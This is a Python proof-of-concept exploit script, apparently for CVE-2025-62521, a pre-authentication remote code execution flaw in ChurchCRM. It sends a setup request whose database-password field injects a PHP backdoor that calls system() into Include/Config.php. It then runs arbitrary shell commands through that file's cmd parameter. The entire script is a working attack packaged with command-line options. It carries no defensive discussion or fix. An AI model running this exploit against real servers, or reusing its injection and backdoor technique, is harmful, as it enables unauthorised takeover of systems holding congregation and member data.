#!/usr/bin/env python3
import requests
import sys
import argparse

def exploit(target_url, cmd="id"):
    setup_url = f"{target_url.rstrip('/')}/setup/"
    
    payload = "'; if(isset($_GET['cmd'])){system($_GET['cmd']);die();} //"
    
    data = {
        "DB_SERVER_NAME": "database",
        "DB_SERVER_PORT": "3306", 
        "DB_NAME": "churchcrm",
        "DB_USER": "churchcrm",
        "DB_PASSWORD": payload,
        "ROOT_PATH": "/",
        "URL": target_url
    }
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Sending malicious setup request...")
    
    try:
        resp = requests.post(setup_url, data=data, timeout=10)
        
        if resp.status_code == 200:
            print("[+] Setup request successful, payload injected!")
        elif resp.status_code == 403:
            print("[*] Setup already completed, checking existing backdoor...")
        else:
            print(f"[-] Setup request failed with status: {resp.status_code}")
            return False
            
    except Exception as e:
        print(f"[-] Error during setup: {e}")
        return False
    
    print(f"[*] Executing command: {cmd}")
    try:
        rce_url = f"{target_url.rstrip('/')}/Include/Config.php?cmd={cmd}"
        resp = requests.get(rce_url, timeout=10)
        output = resp.text.strip()
        
        if output:
            print(f"[+] Command output:\n{output}")
            return True
        else:
            print("[-] No output received")
            return False
            
    except Exception as e:
        print(f"[-] Error executing command: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-62521 ChurchCRM Pre-Auth RCE PoC')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://localhost:8088/)')
    parser.add_argument('-c', '--cmd', default='id', help='Command to execute (default: id)')
    args = parser.parse_args()
    
    success = exploit(args.target, args.cmd)
    sys.exit(0 if success else 1)

if __name__ == '__main__':
    main()
